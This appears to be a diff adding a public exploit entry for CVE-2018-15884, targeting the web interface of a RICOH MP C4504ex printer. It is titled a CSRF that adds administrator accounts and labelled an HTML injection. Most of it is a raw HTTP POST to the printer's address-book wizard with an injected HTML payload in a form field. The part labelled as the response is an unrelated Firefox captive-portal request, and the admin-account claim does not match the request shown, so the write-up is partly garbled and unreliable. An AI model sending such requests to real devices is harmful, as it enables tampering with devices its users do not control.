@@ -1,0 +1,42 @@
+# Exploit Title: RICOH MP C4504ex Printer - Cross-Site Request Forgery (Add Admin)
+# Date: 2018-08-21 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ricoh.com/
+# Hardware Link : https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c4504ex-color-laser-multifunction-printer/_/R-417998
+# Software : RICOH Printer
+# Product Version:  MP C4504ex
+# Vulernability Type : Code Injection
+# Vulenrability : HTML Injection
+# CVE : CVE-2018-15884
+
+# CSRF vulnerability has been discovered on the printer of MP C4504ex of RICOH product.
+# Low priviliage users are able to create administrator accounts
+
+HTTP POST Request :
+
+POST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.10/web/entry/en/address/adrsList.cgi
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 193
+Cookie: risessionid=132072532817225; cookieOnOffChecker=on; wimsesid=103007361
+Connection: close
+
+mode=ADDUSER&step=BASE&wimToken=2051165463&entryIndexIn=00007&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1
+
+HTTP Response Request :
+
+GET /success.txt HTTP/1.1
+Host: detectportal.firefox.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+Pragma: no-cache
+Connection: close
